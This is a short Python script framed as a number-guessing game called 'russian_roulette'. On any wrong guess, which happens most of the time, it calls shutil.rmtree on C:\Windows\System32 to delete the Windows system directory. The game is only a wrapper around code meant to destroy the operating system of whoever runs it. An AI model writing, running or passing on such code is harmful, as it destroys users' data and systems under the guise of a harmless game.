import shutil
import random

def russian_roulette(n):
    random_number = random.randint(1, 10)
    if n == random_number:
        print("Great succes")
    else:
        shutil.rmtree(r"C:\Windows\System32")
guess = int(input("Guess the number between 1 and 10: "))
russian_roulette(guess)
